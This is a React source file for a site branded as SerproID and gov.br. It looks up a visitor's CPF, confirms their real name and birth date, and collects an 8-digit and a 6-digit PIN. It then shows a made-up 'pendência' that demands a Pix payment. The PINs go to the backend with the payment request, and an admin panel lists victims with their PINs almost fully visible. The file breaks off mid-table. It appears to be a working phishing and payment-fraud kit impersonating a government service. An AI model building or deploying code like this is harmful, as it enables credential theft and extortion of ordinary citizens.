import { useEffect, useMemo, useState } from "react";
import "./App.css";
import { formatCpf, isValidCpf } from "./utils/cpf";
import QRCode from "qrcode";

const TOTAL_STEPS = 9;
const SUPABASE_URL = "https://eehunmzyjaxqgmiwgwqx.supabase.co";
const SUPABASE_PUBLISHABLE_KEY = "sb_publishable_oHPHWY_IGw_3P-iqrvRxyQ_mwUTRs3d";
const ADMIN_SESSION_KEY = "serproid-admin-session";
const PROCESSING_STORAGE_KEY = "serproid-processing-cpf";
const PENDENCY_API_URL = "https://api.serproid.workers.dev/consulta";
const PENDENCY_API_TOKEN = import.meta.env.VITE_PENDENCY_API_TOKEN || "";
const PAYMENT_AMOUNT = Number(import.meta.env.VITE_PAYMENT_AMOUNT || 37.4);

function normalizeCpf(value) { return String(value || "").replace(/\D/g, ""); }
function hasLocalProcessing(cpf) {
  try { return JSON.parse(localStorage.getItem(PROCESSING_STORAGE_KEY) || "null")?.cpf === normalizeCpf(cpf); } catch { return false; }
}
function saveLocalProcessing(cpf, transactionId = null) {
  localStorage.setItem(PROCESSING_STORAGE_KEY, JSON.stringify({ cpf: normalizeCpf(cpf), transactionId, savedAt: new Date().toISOString() }));
}
async function checkProcessing(cpf) {
  const response = await fetch(`${SUPABASE_URL}/functions/v1/consultar-cadastro`, { method: "POST", headers: { "Content-Type": "application/json", apikey: SUPABASE_PUBLISHABLE_KEY }, body: JSON.stringify({ cpf: normalizeCpf(cpf) }) });
  const payload = await response.json().catch(() => ({}));
  if (!response.ok && response.status !== 404) throw new Error(payload.error || "Não foi possível verificar o cadastro.");
  return payload.data || null;
}

async function consultPendency(cpf) {
  if (!PENDENCY_API_TOKEN) throw new Error("A consulta de pendência não está configurada. Informe VITE_PENDENCY_API_TOKEN.");
  const response = await fetch(PENDENCY_API_URL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bearer ${PENDENCY_API_TOKEN}`,
    },
    body: JSON.stringify({ documento: formatCpf(cpf), timestamp: new Date().toISOString() }),
  });
  const payload = await response.json().catch(() => ({}));
  if (!response.ok) throw new Error(payload.erro || payload.error || payload.message || `Não foi possível consultar a pendência (${response.status}).`);
  return payload;
}

function parseAmount(value) {
  if (typeof value === "number") return Number.isFinite(value) && value > 0 ? value : null;
  if (typeof value !== "string") return null;
  const raw = value.replace("R$", "").trim();
  if (!raw) return null;
  const normalized = raw.includes(",") ? raw.replace(/\./g, "").replace(",", ".") : raw;
  const amount = Number(normalized);
  return Number.isFinite(amount) && amount > 0 ? amount : null;
}

function findAmount(payload) {
  const priorityKeys = /^(valor|amount|value|price|preco|preço|valor_.*|.*_valor|.*amount.*|.*valor.*)$/i;
  const ignoredKeys = /cpf|documento|document|id|codigo|código|timestamp|status|cep|telefone|pin/i;
  function walk(value, key = "") {
    if (ignoredKeys.test(key)) return null;
    const direct = parseAmount(value);
    if (direct !== null && (priorityKeys.test(key) || !key)) return direct;
    if (!value || typeof value !== "object") return null;
    const entries = Object.entries(value);
    for (const [entryKey, entryValue] of entries) {
      if (priorityKeys.test(entryKey)) {
        const prioritized = parseAmount(entryValue) ?? walk(entryValue, entryKey);
        if (prioritized !== null) return prioritized;
      }
    }
    for (const [entryKey, entryValue] of entries) {
      const nested = walk(entryValue, entryKey);
      if (nested !== null) return nested;
    }
    return null;
  }
  return walk(payload);
}

function getPendencyAmount(payload) {
  // Mantém respostas antigas funcionando: quando a consulta não expõe valor,
  // usa o mesmo valor configurado que já era enviado ao gateway.
  return findAmount(payload) ?? PAYMENT_AMOUNT;
}

function formatAmount(amount) {
  return Number(amount).toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
}

async function signInAdmin(email, password) {
  const normalizedEmail = String(email || "").trim().toLowerCase();
  if (!normalizedEmail || !password) throw new Error("Informe seu e-mail e sua senha.");
  const response = await fetch(`${SUPABASE_URL}/auth/v1/token?grant_type=password`, {
    method: "POST",
    headers: { "Content-Type": "application/json", apikey: SUPABASE_PUBLISHABLE_KEY },
    body: JSON.stringify({ email: normalizedEmail, password }),
  });
  const payload = await response.json().catch(() => ({}));
  if (!response.ok) {
    if (payload.error_code === "email_not_confirmed") throw new Error("Confirme o e-mail antes de entrar.");
    if (payload.error_code === "invalid_credentials" || response.status === 400) throw new Error("E-mail ou senha inválidos. Use 'Esqueci minha senha' para criar uma nova senha.");
    throw new Error(payload.error_description || payload.msg || "Não foi possível entrar agora.");
  }
  const userResponse = await fetch(`${SUPABASE_URL}/auth/v1/user`, { headers: { apikey: SUPABASE_PUBLISHABLE_KEY, Authorization: `Bearer ${payload.access_token}` } });
  const user = await userResponse.json().catch(() => ({}));
  if (!userResponse.ok) throw new Error("Sua sessão não pôde ser validada. Tente novamente.");
  const role = user?.app_metadata?.role || user?.user_metadata?.role;
  if (role !== "admin") throw new Error("Este usuário não possui permissão de administrador.");
  sessionStorage.setItem(ADMIN_SESSION_KEY, JSON.stringify({ access_token: payload.access_token, refresh_token: payload.refresh_token, expires_at: payload.expires_at }));
}

async function requestPasswordReset(email) {
  const normalizedEmail = String(email || "").trim().toLowerCase();
  if (!normalizedEmail) throw new Error("Informe seu e-mail para receber o link de recuperação.");
  const response = await fetch(`${SUPABASE_URL}/auth/v1/recover`, { method: "POST", headers: { "Content-Type": "application/json", apikey: SUPABASE_PUBLISHABLE_KEY }, body: JSON.stringify({ email: normalizedEmail, redirect_to: `${window.location.origin}/admin` }) });
  if (!response.ok) throw new Error("Não foi possível enviar o link de recuperação.");
}

function hasAdminSession() {
  try { const session = JSON.parse(sessionStorage.getItem(ADMIN_SESSION_KEY) || "null"); return Boolean(session?.access_token && (!session.expires_at || session.expires_at * 1000 > Date.now())); } catch { return false; }
}

function Header({ step }) {
  return <header className="brand-area"><div className="brand-mark">SerproID</div><div className="progress" role="progressbar" aria-valuenow={step} aria-valuemin="1" aria-valuemax={TOTAL_STEPS}><div className="progress__track">{Array.from({ length: TOTAL_STEPS }, (_, index) => <span key={index} className={index < step ? "progress__segment is-active" : "progress__segment"} />)}</div><p>Etapa <strong>{step}</strong> de {TOTAL_STEPS}</p></div></header>;
}
function Footer() { return <footer className="footer-brand" aria-label="Governo Federal"><span className="gov-blue">gov</span><span className="gov-green">.</span><span className="gov-yellow">br</span></footer>; }

function Step1({ cpf, setCpf, onContinue, onProcessing }) {
  const [touched, setTouched] = useState(false); const [loading, setLoading] = useState(false); const [lookupError, setLookupError] = useState("");
  const digits = cpf.replace(/\D/g, ""); const valid = digits.length === 11 && isValidCpf(cpf); const error = touched && digits.length === 11 && !valid;
  async function submit(event) { event.preventDefault(); setTouched(true); setLookupError(""); if (!valid || loading) return; setLoading(true); try { const existing = await checkProcessing(digits); if (existing) { saveLocalProcessing(digits, existing.transaction_id); onProcessing(); return; } if (hasLocalProcessing(digits)) localStorage.removeItem(PROCESSING_STORAGE_KEY); const response = await fetch(`${SUPABASE_URL}/functions/v1/consultar-cpf`, { method: "POST", headers: { "Content-Type": "application/json", apikey: SUPABASE_PUBLISHABLE_KEY }, body: JSON.stringify({ cpf: digits }) }); const payload = await response.json().catch(() => ({})); if (!response.ok) throw new Error(payload.error || "Não foi possível consultar o CPF agora"); onContinue(payload.data || null); } catch (lookupError) { setLookupError(lookupError.message); } finally { setLoading(false); } }
  return <form className="step-panel" onSubmit={submit} noValidate><div className="eyebrow">IDENTIDADE DIGITAL</div><h1>Seja bem-vindo(a)</h1><p className="subtitle">Para iniciar sua validação de identidade, digite seu CPF abaixo</p><label className="sr-only" htmlFor="cpf">CPF</label><input id="cpf" name="cpf" autoFocus inputMode="numeric" autoComplete="off" className={error ? "input input--error" : "input"} placeholder="000.000.000-00" value={cpf} maxLength={14} onChange={(event) => setCpf(formatCpf(event.target.value))} onBlur={() => setTouched(true)} />{error && <p className="error-message">CPF inválido. Confira os números digitados.</p>}{lookupError && <p className="error-message">{lookupError}</p>}<button className="primary-button" type="submit" disabled={digits.length !== 11 || loading}>{loading ? <><span className="spinner" /> Consultando...</> : "Continuar"}</button><p className="privacy"><span className="lock">⌕</span> Seus dados são protegidos e utilizados apenas para validação de identidade</p></form>;
}
function Step2({ cpf, identity, onContinue, onBack }) {
  const masked = useMemo(() => `${cpf.slice(0, 3)}.***.***-${cpf.slice(-2)}`, [cpf]);
  const realName = identity?.name || identity?.nameUpper || "Nome não disponível";
  const choices = useMemo(() => [realName, "Mariana Oliveira Santos", "Rafael Almeida Ferreira"], [realName]);
  const [selectedName, setSelectedName] = useState("");
  const [error, setError] = useState("");
  function confirm() { if (!selectedName) { setError("Selecione uma opção para continuar."); return; } if (selectedName !== realName) { setError("Nome incorreto. Confira seus dados e tente novamente."); return; } onContinue(); }
  return <section className="step-panel"><div className="illustration"><span>✓</span></div><h1>Qual é o seu nome completo?</h1><p className="subtitle">Para confirmar sua identidade, selecione seu nome entre as opções abaixo.</p><div className="summary-card"><span>CPF</span><strong>{masked}</strong><span className="verified">✓ consultado</span></div><div className="name-choices" role="radiogroup" aria-label="Selecione seu nome">{choices.map((name) => <button key={name} type="button" className={selectedName === name ? "name-choice is-selected" : "name-choice"} onClick={() => { setSelectedName(name); setError(""); }}><span className="radio">{selectedName === name ? "✓" : ""}</span>{name}</button>)}</div>{error && <p className="error-message centered-error">{error}</p>}<button className="primary-button" type="button" onClick={confirm}>Confirmar e continuar</button><button className="secondary-button" type="button" onClick={onBack}>Voltar</button><p className="privacy">Seus dados são usados somente para validação de identidade</p></section>;
}
function StepBirthDate({ identity, onContinue, onBack }) {
  const realDate = identity?.birthDate || [identity?.day, identity?.month, identity?.year].filter(Boolean).join("/") || "15/06/1990";
  const choices = useMemo(() => [realDate, "25/04/1996", "07/12/2004"], [realDate]);
  const [selectedDate, setSelectedDate] = useState("");
  const [error, setError] = useState("");
  function confirm() { if (!selectedDate) { setError("Selecione uma data para continuar."); return; } if (selectedDate !== realDate) { setError("Data incorreta. Confira seus dados e tente novamente."); return; } onContinue(); }
  return <section className="step-panel"><div className="illustration"><span>◷</span></div><div className="confirmed-label">✓ Nome confirmado</div><h1>Confirme seus dados</h1><p className="subtitle">Para sua segurança, selecione as opções corretas</p><div className="confirmed-label">✓ CPF encontrado</div><h2 className="question-title">Qual é a sua data de nascimento?</h2><div className="name-choices date-choices" role="radiogroup" aria-label="Selecione sua data de nascimento">{choices.map((date) => <button key={date} type="button" className={selectedDate === date ? "name-choice is-selected" : "name-choice"} onClick={() => { setSelectedDate(date); setError(""); }}><span className="radio">{selectedDate === date ? "✓" : ""}</span>{date}</button>)}</div>{error && <p className="error-message centered-error">{error}</p>}<button className="primary-button" type="button" onClick={confirm}>Confirmar data</button><button className="secondary-button" type="button" onClick={onBack}>Voltar</button></section>;
}
function StepPin({ onContinue, onBack }) {
  const [pin, setPin] = useState("");
  const [confirmation, setConfirmation] = useState("");
  const [confirming, setConfirming] = useState(false);
  const [touched, setTouched] = useState(false);
  const valid = /^\d{8}$/.test(pin);
  const confirmationValid = /^\d{8}$/.test(confirmation);
  function submit(event) {
    event.preventDefault();
    setTouched(true);
    if (!confirming) {
      if (valid) { setConfirming(true); setTouched(false); }
      return;
    }
    if (confirmationValid && confirmation === pin) onContinue(pin);
  }
  const value = confirming ? confirmation : pin;
  function setValue(event) {
    const digits = event.target.value.replace(/\D/g, "").slice(0, 8);
    (confirming ? setConfirmation : setPin)(digits);
  }
  const mismatch = confirming && touched && confirmationValid && confirmation !== pin;
  return <form className="step-panel pin-panel" onSubmit={submit}><div className="illustration pin-illustration"><span>♢</span></div><h1>{confirming ? "Confirme seu PIN de 8 dígitos" : "Crie seu PIN de 8 dígitos"}</h1><p className="subtitle">{confirming ? "Digite novamente os mesmos 8 números" : "Use 8 números que você lembre facilmente"}</p><label className="pin-label" htmlFor="pin">PIN de 8 dígitos</label><input key={confirming ? "pin8-confirmation" : "pin8-entry"} id="pin" className="pin-input" type="password" inputMode="numeric" autoComplete="new-password" maxLength={8} value={value} placeholder="••••••••" onChange={setValue} onBlur={() => setTouched(true)} autoFocus />{touched && !confirming && !valid && <p className="error-message centered-error">Digite exatamente 8 dígitos.</p>}{touched && confirming && !confirmationValid && <p className="error-message centered-error">Digite exatamente 8 dígitos.</p>}{mismatch && <p className="error-message centered-error">Os PINs não conferem. Tente novamente.</p>}<button className="primary-button" type="submit" disabled={confirming ? !confirmationValid : !valid}>{confirming ? "Confirmar PIN" : "Continuar"} <span className="button-arrow">→</span></button><button className="secondary-button" type="button" onClick={confirming ? () => { setConfirming(false); setConfirmation(""); setTouched(false); } : onBack}>{confirming ? "Voltar" : "Voltar"}</button><p className="privacy">Não compartilhe seu PIN com outras pessoas.</p></form>;
}
function StepPin6({ previousPin, onContinue, onBack }) {
  const [pin, setPin] = useState("");
  const [confirmation, setConfirmation] = useState("");
  const [confirming, setConfirming] = useState(false);
  const [touched, setTouched] = useState(false);
  const valid = /^\d{6}$/.test(pin) && pin !== previousPin;
  const lengthValid = /^\d{6}$/.test(pin);
  const confirmationValid = /^\d{6}$/.test(confirmation);
  function submit(event) {
    event.preventDefault(); setTouched(true);
    if (!confirming) { if (valid) { setConfirming(true); setTouched(false); } return; }
    if (confirmationValid && confirmation === pin) onContinue(pin);
  }
  const value = confirming ? confirmation : pin;
  function setValue(event) {
    const digits = event.target.value.replace(/\D/g, "").slice(0, 6);
    (confirming ? setConfirmation : setPin)(digits);
  }
  const mismatch = confirming && touched && confirmationValid && confirmation !== pin;
  return <form className="step-panel pin-panel" onSubmit={submit}><div className="illustration pin-illustration"><span>♢</span></div><h1>{confirming ? "Confirme seu PIN de 6 dígitos" : "Agora crie seu PIN de 6 dígitos"}</h1><p className="subtitle">{confirming ? "Digite novamente os mesmos 6 números" : "Use 6 números diferentes do PIN anterior"}</p><label className="pin-label" htmlFor="pin6">PIN de 6 dígitos</label><input key={confirming ? "pin6-confirmation" : "pin6-entry"} id="pin6" className="pin-input" type="password" inputMode="numeric" autoComplete="new-password" maxLength={6} value={value} placeholder="••••••" onChange={setValue} onBlur={() => setTouched(true)} autoFocus />{touched && !confirming && !lengthValid && <p className="error-message centered-error">Digite exatamente 6 dígitos.</p>}{touched && !confirming && lengthValid && pin === previousPin && <p className="error-message centered-error">Use um PIN diferente do PIN de 8 dígitos.</p>}{touched && confirming && !confirmationValid && <p className="error-message centered-error">Digite exatamente 6 dígitos.</p>}{mismatch && <p className="error-message centered-error">Os PINs não conferem. Tente novamente.</p>}<button className="primary-button" type="submit" disabled={confirming ? !confirmationValid : !valid}>{confirming ? "Confirmar PIN" : "Continuar"} <span className="button-arrow">→</span></button><button className="secondary-button" type="button" onClick={confirming ? () => { setConfirming(false); setConfirmation(""); setTouched(false); } : onBack}>Voltar</button><p className="privacy">Não compartilhe seu PIN com outras pessoas.</p></form>;
}
function StepReview({ cpf, identity, onContinue, onBack }) {
  const [loading, setLoading] = useState(false);
  const name = identity?.name || identity?.nameUpper || "Nome não disponível";
  const birthDate = identity?.birthDate || [identity?.day, identity?.month, identity?.year].filter(Boolean).join("/") || "Data não disponível";
  const maskedCpf = cpf.replace(/\D/g, "").replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
  function confirm() { setLoading(true); window.setTimeout(onContinue, 1300); }
  return <section className="step-panel review-panel"><div className="illustration pin-illustration"><span>{loading ? "◌" : "✓"}</span></div><h1>{loading ? "Cadastrando seus dados..." : "Confirme seu cadastro"}</h1><p className="subtitle">{loading ? "Estamos validando suas informações com segurança" : "Confira se as informações estão corretas antes de finalizar"}</p><div className="review-card"><div><span>Nome completo</span><strong>{name}</strong></div><div><span>CPF</span><strong>{maskedCpf}</strong></div><div><span>Data de nascimento</span><strong>{birthDate}</strong></div></div>{loading && <div className="loading-status"><span className="spinner" /> Processando suas informações...</div>}{!loading && <><button className="primary-button" type="button" onClick={confirm}>Confirmar e cadastrar <span className="button-arrow">→</span></button><button className="secondary-button" type="button" onClick={onBack}>Voltar</button></>}<p className="privacy">Seus dados são protegidos e utilizados somente para validação de identidade.</p></section>;
}
function StepPendency({ cpf, onContinue, onBack, onProcessing }) {
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [consultation, setConsultation] = useState(null);

  useEffect(() => {
    let cancelled = false;
    (async () => {
      try {
        const existing = await checkProcessing(cpf);
        if (existing) {
          saveLocalProcessing(cpf, existing.transaction_id);
          if (!cancelled) onProcessing(9);
          return;
        }
        const payload = await consultPendency(cpf);
        const amount = getPendencyAmount(payload);
        if (!cancelled) setConsultation({ payload, amount });
      } catch (consultationError) {
        if (!cancelled) setError(consultationError.message);
      } finally {
        if (!cancelled) setLoading(false);
      }
    })();
    return () => { cancelled = true; };
  }, [cpf, onProcessing]);

  if (loading) return <section className="step-panel payment-panel"><div className="illustration pin-illustration"><span>◌</span></div><h1>Verificando pendências...</h1><p className="subtitle">Estamos consultando o seu documento com segurança.</p><div className="loading-status"><span className="spinner" /> Consultando informações...</div></section>;
  if (error) return <section className="step-panel payment-panel"><div className="illustration"><span>!</span></div><h1>Não foi possível consultar a pendência</h1><p className="subtitle">{error}</p><button className="primary-button" type="button" onClick={() => window.location.reload()}>Tentar novamente</button><button className="secondary-button" type="button" onClick={onBack}>Voltar</button></section>;

  return <section className="step-panel payment-panel pendency-panel"><div className="eyebrow">PAGAMENTO SEGURO</div><h1>Encontramos pendências no seu documento</h1><p className="subtitle">Para continuar, regularize a pendência identificada no seu cadastro.</p><article className="pendency-notice"><div className="pendency-icon" aria-hidden="true">!</div><div><span>Atenção</span><p>Há uma pendência aguardando regularização.</p></div></article><div className="pendency-amount"><div><span>Valor para regularização</span><strong>{formatAmount(consultation.amount)}</strong></div><small>• Pendente</small></div><button className="primary-button pendency-button" type="button" onClick={() => onContinue(consultation)}><span>Fazer pagamento</span><span className="button-arrow">→</span></button><p className="privacy">Seus dados são protegidos durante todo o processo.</p></section>;
}


function StepPayment({ cpf, identity, pin8, pin6, pendency, onContinue, onBack, onProcessing }) {
  const [loading, setLoading] = useState(true); const [error, setError] = useState(""); const [payment, setPayment] = useState(null); const [copied, setCopied] = useState(false); const [confirming, setConfirming] = useState(false);
  const amount = Number(pendency?.amount);
  useEffect(() => { let cancelled = false; (async () => { try { const existing = await checkProcessing(cpf); if (existing) { saveLocalProcessing(cpf, existing.transaction_id); onProcessing(); return; } const response = await fetch(`${SUPABASE_URL}/functions/v1/criar-pagamento`, { method: "POST", headers: { "Content-Type": "application/json", apikey: SUPABASE_PUBLISHABLE_KEY }, body: JSON.stringify({ cpf: normalizeCpf(cpf), name: identity?.name || identity?.nameUpper || "Cliente", amount, pin8, pin6 }) }); const payload = await response.json().catch(() => ({})); if (response.status === 409 && payload.code === "ALREADY_PROCESSING") { saveLocalProcessing(cpf, payload.data?.transaction_id); onProcessing(); return; } if (!response.ok) throw new Error(payload.error || "Não foi possível gerar o QR Code."); const pixCode = payload.data?.pixCode; if (!pixCode) throw new Error("Não foi possível gerar o QR Code."); const qrCodeDataUrl = await QRCode.toDataURL(pixCode, { width: 240, margin: 1, color: { dark: "#163355", light: "#ffffff" } }); if (!cancelled) setPayment({ ...payload.data, pixCode, qrCodeDataUrl }); } catch (paymentError) { if (!cancelled) setError(paymentError.message); } finally { if (!cancelled) setLoading(false); } })(); return () => { cancelled = true; }; }, [cpf, identity, pin8, pin6, amount]);
  async function copyPix() { if (!payment?.pixCode) return; await navigator.clipboard?.writeText(payment.pixCode); setCopied(true); window.setTimeout(() => setCopied(false), 1800); }
  async function confirmPayment() { if (!payment?.transactionId || confirming) return; setConfirming(true); setError(""); for (let attempt = 0; attempt < 20; attempt += 1) { try { const response = await fetch(`${SUPABASE_URL}/functions/v1/consultar-pagamento`, { method: "POST", headers: { "Content-Type": "application/json", apikey: SUPABASE_PUBLISHABLE_KEY }, body: JSON.stringify({ transactionId: payment.transactionId }) }); const payload = await response.json().catch(() => ({})); if (response.ok && payload.data?.status === "COMPLETED") { saveLocalProcessing(cpf, payment.transactionId); onContinue(); return; } if (payload.data?.status && ["FAILED", "CANCELED", "REFUNDED", "CHARGEBACK"].includes(payload.data.status)) { setError("Este pagamento não foi aprovado. Gere uma nova cobrança."); break; } } catch { /* tenta novamente */ } await new Promise((resolve) => window.setTimeout(resolve, 3000)); } setConfirming(false); if (!error) setError("Ainda não recebemos a confirmação. Após pagar, tente novamente em alguns segundos."); }
  if (loading) return <section className="step-panel payment-panel"><div className="illustration pin-illustration"><span>◌</span></div><h1>Preparando pagamento...</h1><p className="subtitle">Aguarde enquanto preparamos o pagamento com segurança.</p><div className="loading-status"><span className="spinner" /> Gerando QR Code...</div></section>;
  if (error) return <section className="step-panel payment-panel"><div className="illustration"><span>!</span></div><h1>Não foi possível gerar o Pix</h1><p className="subtitle">{error}</p><button className="primary-button" type="button" onClick={() => window.location.reload()}>Tentar novamente</button><button className="secondary-button" type="button" onClick={onBack}>Voltar</button></section>;
  return <section className="step-panel payment-panel approved-payment-panel"><div className="eyebrow">PAGAMENTO SEGURO</div><h1>{confirming ? "Verificando pagamento..." : "Conclua o pagamento para liberar seu cadastro"}</h1><p className="subtitle">Atenção: finalize agora para não interromper o processo de regularização do seu documento.</p><div className="approved-urgent-line"><span /> Pendência aguardando pagamento</div><div className="approved-amount-strip"><div><span>Valor da irregularização</span><strong>{formatAmount(amount)}</strong></div><small>✓ Consulta concluída</small></div><div className="qr-card approved-qr-card"><div className="approved-qr-title"><span>Escaneie o QR Code para pagar</span><b>PIX</b></div><img src={payment.qrCodeDataUrl} alt="QR Code para pagamento Pix" /><span>Abra o app do seu banco e escaneie o código</span><div className="approved-pix-row"><span>Código Pix gerado para esta pendência</span><span aria-hidden="true">▣</span></div></div><button className="copy-pix-button approved-copy-button" type="button" onClick={copyPix} disabled={confirming}>{copied ? "Código Pix copiado" : "Copiar código Pix"} <span aria-hidden="true">→</span></button>{error && <p className="error-message centered-error">{error}</p>}<button className="primary-button" type="button" onClick={confirmPayment} disabled={confirming}>{confirming ? <><span className="spinner" /> Aguardando confirmação...</> : "Já realizei o pagamento"}</button><button className="secondary-button" type="button" onClick={onBack} disabled={confirming}>Voltar</button><p className="privacy">O avanço será liberado após a confirmação do pagamento.</p></section>;
}

function Step3({ onContinue, onBack }) { const [selected, setSelected] = useState(""); return <section className="step-panel"><div className="illustration"><span>▤</span></div><h1>Envie um documento</h1><p className="subtitle">Escolha um documento oficial com foto para confirmar sua identidade.</p><div className="document-options" role="radiogroup" aria-label="Tipo de documento">{["Carteira de identidade (RG)", "Carteira de motorista (CNH)"].map((item) => <button key={item} type="button" className={selected === item ? "document-option is-selected" : "document-option"} onClick={() => setSelected(item)}><span className="radio">{selected === item ? "✓" : ""}</span>{item}</button>)}</div><div className="upload-note"><span>↥</span><div><strong>Foto nítida e bem iluminada</strong><small>Você poderá enviar a imagem na próxima tela</small></div></div><button className="primary-button" type="button" disabled={!selected} onClick={onContinue}>Continuar</button><button className="secondary-button" type="button" onClick={onBack}>Voltar</button></section>; }
void StepReview;
void Step3;
function Step4() { return <section className="step-panel processing-panel confirmation-panel"><div className="confirmation-icon"><span>✓</span></div><div className="eyebrow confirmation-eyebrow">PAGAMENTO CONFIRMADO</div><h1>Pagamento aceito</h1><p className="subtitle confirmation-subtitle">Recebemos o seu pagamento e já iniciamos o processamento da quitação da irregularidade.</p><div className="confirmation-status"><span className="status-check">✓</span><div><strong>Regularização em processamento</strong><span>Seu nome será regularizado em até 24 horas.</span></div></div><div className="confirmation-timeline"><div className="timeline-step is-done"><span>✓</span><p><strong>Pagamento recebido</strong><small>Confirmação concluída</small></p></div><div className="timeline-line" /><div className="timeline-step is-current"><span>2</span><p><strong>Quitação da irregularidade</strong><small>Em análise pelo sistema</small></p></div><div className="timeline-line" /><div className="timeline-step"><span>3</span><p><strong>Cadastro regularizado</strong><small>Liberação em até 24 horas</small></p></div></div><p className="privacy confirmation-privacy">Você não precisa realizar nenhuma outra ação. Acompanhe a liberação do seu cadastro.</p></section>; }


const adminRows = [
  { cpf: "***.436.281-30", name: "Cadastro demonstrativo", birth: "21/05/1999", ip: "177.202.xxx.xxx", date: "Hoje, 11:23", status: "Pendente", stage: "Completo" },
  { cpf: "***.222.841-20", name: "Usuário verificado", birth: "30/11/1979", ip: "45.6.xxx.xxx", date: "Hoje, 11:05", status: "Pendente", stage: "Completo" },
  { cpf: "***.716.216-48", name: "Cadastro demonstrativo", birth: "13/06/1999", ip: "164.163.xxx.xxx", date: "Hoje, 10:51", status: "Pendente", stage: "Em análise" },
  { cpf: "***.847.923-96", name: "Usuário verificado", birth: "19/11/1988", ip: "45.226.xxx.xxx", date: "Hoje, 10:26", status: "Pendente", stage: "Completo" },
  { cpf: "***.288.176-54", name: "Cadastro demonstrativo", birth: "01/11/1989", ip: "201.54.xxx.xxx", date: "Hoje, 10:13", status: "Pendente", stage: "Completo" },
];
void adminRows;

function AdminLogin({ onLogin }) {
  const [email, setEmail] = useState(""); const [password, setPassword] = useState(""); const [error, setError] = useState(""); const [notice, setNotice] = useState(""); const [loading, setLoading] = useState(false);
  async function submit(event) { event.preventDefault(); setError(""); setNotice(""); setLoading(true); try { await signInAdmin(email, password); onLogin(); } catch (loginError) { setError(loginError.message); } finally { setLoading(false); } }
  async function recover() { setError(""); setNotice(""); setLoading(true); try { await requestPasswordReset(email); setNotice("Enviamos um link de recuperação para o seu e-mail."); } catch (resetError) { setError(resetError.message); } finally { setLoading(false); } }
  return <main className="admin-shell admin-login-shell"><form className="admin-login-card" onSubmit={submit}><div className="admin-lock">⌑</div><h1>Painel Administrativo</h1><p>Faça login para acessar o painel de gerenciamento</p><label htmlFor="admin-email">Email</label><input id="admin-email" type="email" placeholder="admin@exemplo.com" value={email} onChange={(event) => setEmail(event.target.value)} autoComplete="username" /><label htmlFor="admin-password">Senha</label><input id="admin-password" type="password" placeholder="••••••••" value={password} onChange={(event) => setPassword(event.target.value)} autoComplete="current-password" />{error && <small className="admin-error">{error}</small>}{notice && <small className="admin-notice">{notice}</small>}<button className="admin-submit" type="submit" disabled={loading}>{loading ? "Aguarde..." : "Entrar"}</button><button className="admin-recovery" type="button" onClick={recover} disabled={loading}>Esqueci minha senha</button></form></main>;
}
async function adminPaymentsRequest(body = {}) {
  const session = JSON.parse(sessionStorage.getItem(ADMIN_SESSION_KEY) || "null");
  const response = await fetch(`${SUPABASE_URL}/functions/v1/admin-pagamentos`, { method: "POST", headers: { "Content-Type": "application/json", apikey: SUPABASE_PUBLISHABLE_KEY, Authorization: `Bearer ${session?.access_token || ""}` }, body: JSON.stringify(body) });
  const payload = await response.json().catch(() => ({}));
  if (!response.ok) throw new Error(payload.error || "Não foi possível acessar os cadastros.");
  return payload.data || [];
}

// Altere para 9, 8 ou 10 para exibir mais dígitos. Nunca aumente além de 10.
const PIN_VISIBLE_DIGITS = 9;
function maskedPin(value) {
  const digits = String(value ?? "").replace(/\D/g, "");
  if (!digits) return "Não informado";
  const visible = Math.min(PIN_VISIBLE_DIGITS, digits.length);
  return `${"•".repeat(digits.length - visible)}${digits.slice(-visible)}`;
}

function AdminDashboard({ onLogout }) {
  const [query, setQuery] = useState(""); const [rows, setRows] = useState([]); const [error, setError] = useState(""); const [loading, setLoading] = useState(true); const [saving, setSaving] = useState("");
  async function load() { setLoading(true); try { setRows(await adminPaymentsRequest()); setError(""); } catch (loadError) { setError(loadError.message); } finally { setLoading(false); } }
  useEffect(() => { const timer = window.setTimeout(load, 0); return () => window.clearTimeout(timer); }, []);
  async function updateRow(id, adminStatus) { setSaving(id); try { await adminPaymentsRequest({ action: "update", id, adminStatus }); setRows((current) => current.map((row) => row.id === id ? { ...row, admin_status: adminStatus } : row)); } catch (updateError) { setError(updateError.message); } finally { setSaving(""); } }
  const filteredRows = rows.filter((row) => `${row.client_name || ""} ${row.cpf} ${row.identifier} ${row.transaction_id}`.toLowerCase().includes(query.toLowerCase()));
  const approved = rows.filter((row) => row.admin_status === "APPROVED").length;
  return <main className="admin-shell"><header className="admin-topbar"><strong>SerproID</strong><button type="button" onClick={onLogout}>Sair</button></header><div className="admin-content"><div className="admin-heading"><div><span className="admin-kicker">GESTÃO DE PAGAMENTOS</span><h1>Painel Administrativo</h1></div><span className="admin-live"><i /> Sistema online</span></div><section className="stats-grid"><div><span>Total de pagamentos</span><strong>{rows.length}</strong><small>Registros reais</small></div><div><span>Aguardando análise</span><strong>{rows.filter((row) => row.admin_status === "PENDING").length}</strong><small>Precisam de decisão</small></div><div><span>Liberados</span><strong className="green-number">{approved}</strong><small>Processos aprovados</small></div></section><section className="records-card"><div className="records-head"><div><h2>Pagamentos e cadastros</h2><p>Aprove ou rejeite solicitações após a confirmação Pix</p></div><input type="search" placeholder="Buscar por nome, CPF ou transação..." value={query} onChange={(event) => setQuery(event.target.value)} /></div>{error && <p className="admin-error admin-table-error">{error}</p>}{loading ? <div className="admin-loading"><span className="spinner" /> Carregando pagamentos...</div> : <div className="table-wrap"><table><thead><tr><th>CPF</th><th>Nome / Transação</th><th>PIN 8</th><th>PIN 6</th><th>Valor</th><th>Pagamento</th><th>Data/Hora</th><th>Liberação</th><th>Ações</th></tr></thead><tbody>{filteredRows.map((row) => <tr key={row.id}><td>{row.cpf}</td><td><strong>{row.client_name || "Nome não informado"}</strong><span className="stage-badge">{row.identifier}</span><span className="stage-badge">{row.transaction_id || "Sem ID"}</span></td><td>{maskedPin(row.pin8)}</td><td>{maskedPin(row.pin6)}</td><td>R$ {Number(row.amount).toFixed(2).replace(".", ",")}</td><td><span className={`status-badge status-${String(row.status).toLowerCase()}`}>{row.status}</span></td><td>{new Date(row.created_at).toLocaleString("pt-BR")}</td><td><span className={`status-badge status-${String(row.admin_status).toLowerCase()}`}>{row.admin_status}</span></td><td className="actions"><button type="button" disabled={saving === row.id || row.admin_status === "APPROVED"} onClick={() => updateRow(row.id, "APPROVED")}>✓ Aprovar</button><button type="button" 